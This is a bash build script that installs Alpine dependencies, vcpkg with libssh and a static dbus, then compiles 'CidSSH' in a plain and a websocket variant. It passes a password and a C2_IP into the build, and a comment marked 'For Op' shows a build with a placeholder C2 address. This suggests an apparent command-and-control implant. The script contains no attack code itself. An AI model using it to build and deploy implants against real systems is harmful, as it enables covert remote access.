#!/usr/bin/env bash

PASSWORD_AUTH=$1
C2_IP=$2
 
echo "*** Current value of \$PASSWORD_AUTH is '$PASSWORD_AUTH' and \$C2_IP is '$C2_IP' ***"

echo "Installing some dependencies we need to build"
apk update

apk add --no-cache \
    build-base \
    cmake \
    autoconf \
    libtool \
    pkgconf \
    git \
    mercurial \
    file \
    linux-headers \
    wget \
    libc-dev \
    boost-dev \
    boost-static \
    boost-system \
    openssl \
    openssl-dev \
    networkmanager-dev \
    glib-dev \
    expat-dev \
    openssl-libs-static \
    libc6-compat \
    cmake \
    ninja

echo "Installing vcpkg"
(	cd /tmp
	git clone https://github.com/Microsoft/vcpkg.git
	cd vcpkg
	echo "set(VCPKG_BUILD_TYPE release)" >> /tmp/vcpkg/triplets/x64-linux.cmake
	./bootstrap-vcpkg.sh --useSystemBinaries -disableMetrics
	VCPKG_FORCE_SYSTEM_BINARIES=1 /tmp/vcpkg/vcpkg install libssh[core,openssl] --triplet x64-linux
)
	
echo "Installing dbus static"
(
	cd /tmp
	wget https://dbus.freedesktop.org/releases/dbus/dbus-1.12.16.tar.gz
	tar -xzvf dbus-1.12.16.tar.gz && cd dbus-1.12.16
	./configure --prefix=/usr                        \
				--sysconfdir=/etc                    \
				--localstatedir=/var                 \
				--enable-user-session                \
				--disable-doxygen-docs               \
				--disable-xml-docs                   \
				--with-systemduserunitdir=no         \
				--with-systemdsystemunitdir=no       \
				--docdir=/usr/share/doc/dbus-1.12.16 \
				--with-console-auth-dir=/run/console \
				--with-system-pid-file=/run/dbus/pid \
				--with-system-socket=/run/dbus/system_bus_socket && make -j$(nproc) && make install
)


# Building CidSSH
rm -rf build
rm -rf build_ws

# Build normal version
cmake -S . -B build -DWITH_WEBSOCKETS=OFF $PASSWORD_AUTH $C2_IP -DCMAKE_TOOLCHAIN_FILE="/tmp/vcpkg/scripts/buildsystems/vcpkg.cmake" -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release -j$(nproc)

# Build websocket version
	cmake -S . -B build_ws -DWITH_WEBSOCKETS=ON -DCMAKE_TOOLCHAIN_FILE="/tmp/vcpkg/scripts/buildsystems/vcpkg.cmake" -DCMAKE_BUILD_TYPE=Release
cmake --build build_ws --config Release -j$(nproc)

# For Op
#RUN mkdir build_custom && cd build_custom && cmake -DCMAKE_BUILD_TYPE=Release -DPASSWORD_AUTH="xxxxxxxxxx" -DC2_IP="XX.XX.XX.XX" .. && make 

